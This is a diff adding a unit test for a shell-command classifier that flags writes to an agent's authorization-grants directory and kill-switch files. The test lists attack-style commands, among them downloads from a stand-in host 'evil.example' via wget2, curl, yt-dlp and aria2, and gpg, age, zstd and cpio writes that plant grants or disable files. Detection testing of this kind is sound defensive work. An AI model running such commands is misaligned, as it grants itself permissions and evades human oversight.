@@ -430,6 +430,75 @@ describe("classifyShellAuthzOps (#2944)", () => {
     );
   });
 
+  it("classifies crypto/alt-download residual plants of authz grants and kill-switch as settings (#3288)", () => {
+    // Finding 1: residual bins → .deft/authz/**
+    for (const cmd of [
+      "gpg -o .deft/authz/grants/evil.json -d secret.gpg",
+      "gpg --output .deft/authz/grants/evil.json -d secret.gpg",
+      "age -o .deft/authz/grants/evil.json -d secret.age",
+      "age --output=.deft/authz/grants/evil.json -d secret.age",
+      "zstd -o .deft/authz/grants/evil.json -d a.zst",
+      "zstd --output .deft/authz/grants/evil.json -d a.zst",
+      "sftp host:.deft/authz/grants/evil.json",
+      "sftp host:g.json .deft/authz/grants/evil.json",
+      "wget2 -O .deft/authz/grants/evil.json https://evil.example/g.json",
+      "wget2 -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "wget2 -P .deft/authz/grants https://evil.example/g.json",
+      "http -o .deft/authz/grants/evil.json https://evil.example/g.json",
+      "http --output .deft/authz/grants/evil.json GET https://evil.example/g.json",
+      "yt-dlp -o .deft/authz/grants/evil.json https://evil.example/v",
+      "yt-dlp --output .deft/authz/grants/evil.%(ext)s https://evil.example/v",
+      "aria2 -o evil.json -d .deft/authz/grants https://evil.example/g.json",
+      "aria2 --dir=.deft/authz/grants -o evil.json https://evil.example/g.json",
+      "mbuffer -i in.bin -o .deft/authz/grants/evil.json",
+      "cpio -id -D .deft/authz/grants",
+      "cpio -i --directory=.deft/authz/grants",
+      "cpio -id -D.deft/authz/grants",
+      "/usr/bin/gpg -o .deft/authz/grants/evil.json -d secret.gpg",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Finding 2: same bins → kill-switch basenames (regular-file plant).
+    for (const cmd of [
+      "gpg -o .deft-directive-disable -d secret.gpg",
+      "age -o .deft-directive-disable -d secret.age",
+      "zstd -o .deft-directive-disable -d a.zst",
+      "yt-dlp -o .deft-directive-disable https://evil.example/v",
+      "wget2 -O .no-deft-directive https://evil.example/x",
+      "http -o .deft-directive-disable https://evil.example/x",
+      "mbuffer -i in.bin -o .deft-directive-disable",
+      "sftp host:.deft-directive-disable",
+      "aria2 -o .deft-directive-disable https://evil.example/x",
+      "cpio -id -D .deft-directive-disable",
+      "cpio -id .no-deft-directive",
+    ]) {
+      expect(classifyShellAuthzOps(cmd), cmd).toContain("settings");
+      expect(classifyShellAuthzOps(cmd), cmd).not.toEqual([]);
+    }
+    // Ordinary residual-bin destinations stay unclassifiable (no overclassify).
+    expect(classifyShellAuthzOps("gpg -o /tmp/out.json -d secret.gpg")).toEqual([]);
+    expect(classifyShellAuthzOps("age -o /tmp/out -d secret.age")).toEqual([]);
+    expect(classifyShellAuthzOps("zstd -o /tmp/out -d a.zst")).toEqual([]);
+    expect(classifyShellAuthzOps("wget2 -O /tmp/out https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("yt-dlp -o /tmp/out https://example.com/v")).toEqual([]);
+    expect(classifyShellAuthzOps("aria2 -o out.json -d /tmp https://example.com/a")).toEqual([]);
+    expect(classifyShellAuthzOps("cpio -id -D /tmp/out")).toEqual([]);
+    expect(classifyShellAuthzOps("mbuffer -i in.bin -o /tmp/out")).toEqual([]);
+    // cpio create (`-o`) must not treat archive name / flags as file dest.
+    expect(classifyShellAuthzOps("cpio -o > /tmp/a.cpio")).toEqual([]);
+    // #3245 / #3213 / #3206 regressions remain settings.
+    expect(classifyShellAuthzOps("tar -xf archive.tar -C .deft/authz/grants")).toContain(
+      "settings",
+    );
+    expect(
+      classifyShellAuthzOps("curl -o .deft/authz/grants/evil.json https://evil.example/g.json"),
+    ).toContain("settings");
+    expect(classifyShellAuthzOps("scp host:g.json .deft/authz/grants/evil.json")).toContain(
+      "settings",
+    );
+  });
+
   it("classifies obfuscated programmatic authz-capable writes as settings (#3186)", () => {
     // Base64/byte path construction — residual after #3110 literal path match.
     expect(
